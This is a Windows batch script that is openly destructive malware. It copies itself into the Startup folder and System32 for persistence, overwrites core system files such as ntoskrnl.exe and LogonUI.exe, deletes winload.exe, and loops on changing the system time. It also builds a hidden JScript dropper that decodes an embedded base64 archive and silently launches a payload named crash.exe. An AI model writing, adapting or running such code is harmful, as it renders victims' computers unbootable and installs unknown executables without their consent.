@echo off
copy %0 %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
cd C:\Windows\System32
copy %0 C:\Windows\System32
xcopy LogonUI.exe crash.bat
chcp 65001
title Ошибка 402 Error 402
xcopy ntoskrnl.exe crash.bat
:crashWinTotal
cd C:\Windows\System32
start dllhost.exe
start winload.exe
start fontdrvhost.exe
copy winload.exe %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
del winload.exe
:winCrash
copy %0
del %0
time 3:00
time 12:00
goto winCrash
goto crashWinTotal
echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js
echo z=f.getAbsolutePathName(^"z.zip^");o.saveToFile(z);s=new ActiveXObject(^"Shell.Application^");>>x.js
echo s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js

set v="%appdata%\crash.exe"
del %v% >NUL 2>NUL
cscript x.js >NUL 2>NUL
del x.js >NUL 2>NUL
del z.zip >NUL 2>NUL
del x >NUL 2>NUL
start "" %v%
